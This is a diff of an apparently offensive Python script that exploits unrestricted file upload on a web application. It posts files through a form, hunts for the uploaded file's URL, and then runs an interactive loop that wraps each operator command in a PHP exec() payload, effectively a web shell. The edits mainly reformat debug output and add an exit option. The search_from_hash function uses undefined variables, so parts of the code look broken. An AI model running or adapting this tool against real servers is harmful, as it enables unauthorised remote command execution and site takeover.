@@ -103,7 +103,7 @@ def upload_file(url, field_name, payload, cookies=None, headers=None):
         files = {field_name: (payload["file_name"], content, payload["mime"])}
     r = requests.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
     if args.details:
-        print(r.text)
+        print(f"#===================CONTENT PAGE===================\n{r.text}")
     return r
 #==============================FUNCTION==============================
 def analyze_response(html):
@@ -136,15 +136,15 @@ def upload_and_analyze(url, field_name, payload, cookies=None, headers=None):
     r = upload_file(url, field_name, payload, cookies, headers)
     u = analyze_response(r.text)
     if args.details:
-        print(r)
-        print(f"analyze_response : {u}")
+        print(f"| analyze_response | {u}")
     return u
 #==============================FUNCTION==============================
 def find_uploaded_file(target_url, payload, returned_path,cookies=None, headers=None, wordlist=None):
     urls = find_file_urls(target_url, payload['file_name'], returned_path, wordlist)
     if args.details:
         for url in urls:
-            print(f'find_file_urls : {url}')
+            print(" +________________+_________________________________")
+            print(f'| find_file_urls | {url}')
     for u in urls:
         r = requests.get(u, cookies=cookies, headers=headers)
         if r.status_code == 200:
@@ -161,12 +161,16 @@ def find_uploaded_file(target_url, payload, returned_path,cookies=None, headers=
 def search_from_hash(base):
     r = requests.get(base, cookies=cookies, headers=headers)
     links = re.findall(r"""href=['"]([^'"]+)['"]""", html, re.I)
+    if args.details:
+        print(f"#===================LINK IN TARGET===================\n")
     for l in links:
-        print(l)
-        page = requests.get(base + l.strip("'\""), cookies=cookies, headers=headers)
-        print(page.text)
-        if hash in page.text:
-            m = re.search(rf"(/[^\"'<>\s]*{re.escape(hash)}[^\"'<>\s]*)", page.text)
+        link = base + l.strip("'\"")
+        page = requests.get(link, cookies=cookies, headers=headers).text
+        if args.details:
+            print(f"| {link}")
+            print(page)
+        if hash in page:
+            m = re.search(rf"(/[^\"'<>\s]*{re.escape(hash)}[^\"'<>\s]*)", page)
             if m:
                 return base.rstrip("/") + m.group(1)
     return None
@@ -231,7 +235,7 @@ if args.url:
         print(f"[+] Upload '{payload['file_name']}' sur la variable '{field_name}'")
         res = upload_and_analyze(args.url, field_name, payload, cookies, headers)
         if args.details:
-            print(f"{payload}\n")
+            print(f"| Content file | {payload}\n")
 
         if not res["success"]:
             print(f"[-] FAIL -> {res['error']}")
@@ -243,9 +247,11 @@ if args.url:
             print("[+] EXPLOIT succes")
 
             while True:
-                cmd = input("Commande à test : ")
+                cmd = input("exit | quit | back to stop exploit\nExploit command : ")
+                if cmd.lower() in ["exit", "quit", "back"]:
+                    print(exit_payload)
+                    exit()        
                 payload["content"] = f"<?php exec('{cmd}', $r); var_dump($r);?>"
-
                 res = upload_and_analyze(args.url, field_name, payload, cookies, headers)
                 if not res["success"]:
                     continue
